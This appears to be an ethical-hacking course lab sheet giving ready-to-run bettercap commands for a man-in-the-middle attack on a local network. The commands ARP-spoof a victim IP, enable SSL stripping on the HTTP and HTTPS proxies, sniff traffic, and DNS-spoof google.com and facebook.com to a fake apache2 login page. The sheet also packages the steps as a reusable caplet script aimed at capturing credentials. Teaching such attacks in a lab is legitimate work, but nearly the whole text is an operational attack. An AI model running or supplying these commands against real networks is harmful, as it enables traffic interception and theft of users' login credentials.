# EHPT Lab 6 – MITM: Bettercap, SSL Strip & DNS Spoofing
# Tools: bettercap, apache2, wireshark

# STEP 1: Install Bettercap
sudo apt install bettercap -y
# OR install latest:
sudo apt install golang -y
go install github.com/bettercap/bettercap@latest 2>/dev/null || sudo apt install bettercap -y

# Verify
bettercap --version

# STEP 2: Install and start Apache2 (for fake page hosting)
sudo apt install apache2 -y
sudo service apache2 start
# Edit fake page:
echo "<h1>Fake Login Page - MITM Demo</h1>" | sudo tee /var/www/html/index.html

# STEP 3: Find your interface and network
ip addr show
# Note your interface (wlan0, eth0, etc.) and IP

# STEP 4: Launch Bettercap
sudo bettercap -iface wlan0
# Now you're in bettercap interactive shell (>>)

# STEP 5: Inside Bettercap shell – run these commands one by one:

# Scan network for hosts
net.probe on

# Show all discovered hosts
net.show

# Set ARP spoof target (replace with victim IP)
set arp.spoof.targets 192.168.1.37

# Start ARP spoofing
arp.spoof on

# Enable SSL stripping (downgrades HTTPS to HTTP)
set http.proxy.sslstrip true
http.proxy on

# Enable HTTPS proxy with SSL strip
set https.proxy.sslstrip true
https.proxy on

# Start network sniffing
net.sniff on

# Enable DNS spoofing (redirect domain to your IP)
set dns.spoof.domains google.com,facebook.com
set dns.spoof.address 192.168.1.43   # your attacker IP
dns.spoof on

# STEP 6: Watch credentials being captured
# Bettercap will print captured credentials in terminal

# STEP 7: Save Bettercap session as script file for quick run
cat > mitm_script.cap << 'EOF'
net.probe on
net.show
set arp.spoof.targets 192.168.1.37
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
set https.proxy.sslstrip true
https.proxy on
net.sniff on
set dns.spoof.domains google.com
set dns.spoof.address 192.168.1.43
dns.spoof on
EOF

# Run bettercap with script:
sudo bettercap -iface wlan0 -caplet mitm_script.cap

# STEP 8: Stop all modules
# Inside bettercap shell:
# arp.spoof off
# http.proxy off
# dns.spoof off
# net.sniff off
# exit

# Conclusion:
# Bettercap was used to perform MITM attack with ARP spoofing.
# SSL stripping downgraded HTTPS to HTTP, exposing login credentials.
# DNS spoofing redirected victim's domain requests to attacker's fake page.
# Captured credentials confirmed the attack's success.
